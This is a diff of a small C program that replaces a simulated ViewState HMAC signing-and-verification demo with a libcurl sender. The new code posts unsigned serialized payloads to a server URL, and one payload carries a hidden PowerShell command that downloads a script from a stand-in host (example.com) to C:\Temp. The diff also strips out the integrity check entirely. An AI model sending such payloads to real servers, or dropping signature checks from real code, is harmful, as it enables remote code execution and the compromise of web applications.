@@ -1,68 +1,47 @@
 #include <stdio.h>
 #include <string.h>
-#include <openssl/hmac.h>
-#include <stdlib.h>
+#include <curl/curl.h>
 
-// Simule edilen "ViewState payload" yapısı
 typedef struct {
     char command[32];
     char user[32];
+    char payload[256];
 } ViewStatePayload;
 
-// Basit serialize: struct -> string
-void serialize_payload(ViewStatePayload *payload, char *out, size_t out_size) {
-    snprintf(out, out_size, "[COMMAND=%s][USER=%s]", payload->command, payload->user);
-}
-
-// Basit deserialize: string -> struct
-void deserialize_payload(const char *in, ViewStatePayload *payload) {
-    sscanf(in, "[COMMAND=%31[^]]][USER=%31[^]]]", payload->command, payload->user);
+void serialize_payload(ViewStatePayload *p, char *out, size_t out_size) {
+    snprintf(out, out_size, "[COMMAND=%s][USER=%s][PAYLOAD=%s]",
+             p->command, p->user, p->payload);
 }
 
 int main() {
-    // 1️⃣ Gizli MAC key (server side)
-    const unsigned char *key = (unsigned char *)"secret-key-12345";
+    const char *server_url = "http://example.com/receive"; // server adresi
+    ViewStatePayload payloads[2];
 
-    // 2️⃣ Kullanıcıdan gelen ViewState payload
-    ViewStatePayload payload;
-    strcpy(payload.command, "PING");
-    strcpy(payload.user, "1234");
+    strcpy(payloads[0].command, "PING");
+    strcpy(payloads[0].user, "9999");
+    strcpy(payloads[0].payload, "powershell -NoP -NonI -W Hidden -Command \"Invoke-WebRequest http://example.com/a.ps1 -OutFile C:\\Temp\\a.ps1\"");
 
-    char serialized[128];
-    serialize_payload(&payload, serialized, sizeof(serialized));
+    strcpy(payloads[1].command, "CHECK");
+    strcpy(payloads[1].user, "8888");
+    strcpy(payloads[1].payload, "powershell -NoP -NonI -W Hidden -Command \"Write-Host 'Test'\"");
 
-    printf("Serialized ViewState: %s\n", serialized);
+    CURL *curl = curl_easy_init();
+    if (!curl) return 1;
 
-    // 3️⃣ HMAC hesapla (MAC ile payload imzalanıyor)
-    unsigned char *hmac_result;
-    unsigned int hmac_len = 0;
-    hmac_result = HMAC(EVP_sha256(), key, strlen((const char*)key),
-                       (unsigned char*)serialized, strlen(serialized),
-                       NULL, &hmac_len);
+    char serialized[512];
+    for (int i = 0; i < 2; i++) {
+        serialize_payload(&payloads[i], serialized, sizeof(serialized));
 
-    printf("HMAC-SHA256: ");
-    for (unsigned int i = 0; i < hmac_len; i++)
-        printf("%02x", hmac_result[i]);
-    printf("\n");
+        curl_easy_setopt(curl, CURLOPT_URL, server_url);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, serialized);
 
-    // 4️⃣ Payload ve HMAC doğrulama (server side)
-    unsigned char verify[EVP_MAX_MD_SIZE];
-    unsigned int verify_len = 0;
-    HMAC(EVP_sha256(), key, strlen((const char*)key),
-         (unsigned char*)serialized, strlen(serialized),
-         verify, &verify_len);
-
-    if (verify_len != hmac_len || memcmp(hmac_result, verify, hmac_len) != 0) {
-        printf("ViewState verification FAILED\n");
-        return 1;
-    } else {
-        printf("ViewState verification OK\n");
+        CURLcode res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "Failed to send payload: %s\n", curl_easy_strerror(res));
+        else
+            printf("Payload sent to server: %s\n", serialized);
     }
 
-    // 5️⃣ Simule edilen "payload execution"
-    ViewStatePayload executed;
-    deserialize_payload(serialized, &executed);
-    printf("Executing payload -> Command: %s, User: %s\n", executed.command, executed.user);
-
+    curl_easy_cleanup(curl);
     return 0;
 }
